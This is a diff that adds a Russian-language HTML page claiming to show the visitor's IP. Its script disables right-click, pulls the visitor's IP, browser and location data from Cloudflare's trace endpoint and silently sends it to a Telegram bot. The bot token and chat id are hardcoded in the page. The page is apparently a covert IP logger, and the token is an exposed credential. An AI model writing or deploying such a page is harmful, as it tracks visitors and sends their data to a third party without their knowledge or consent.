@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+	<meta charset="utf-8">
+</head>
+<script src="http://code.jquery.com/jquery-1.8.3.js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<script type="text/javascript">
+	document.oncontextmenu = function () {
+		return false;
+	}
+	// .replace( /"/g, ":" )
+	// alert(JSON.stringify(data.geobytesremoteip, null, 2));
+	$.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
+		console.log(data)
+		let url = 'https://api.telegram.org/bot1319376539:AAHfB2WJHK6_sGBqlv8jnd0OSAM9W9bKhYk/sendMessage?chat_id=1108316101&text=' + data;
+		let xhttp = new XMLHttpRequest();
+		xhttp.open("GET", url);
+		xhttp.send();
+	});
+</script>
+<body>
+	<h1>Привет!</h1>
+	<h2 id="ipv">твой IP: </h2>
+</body>
+</html>
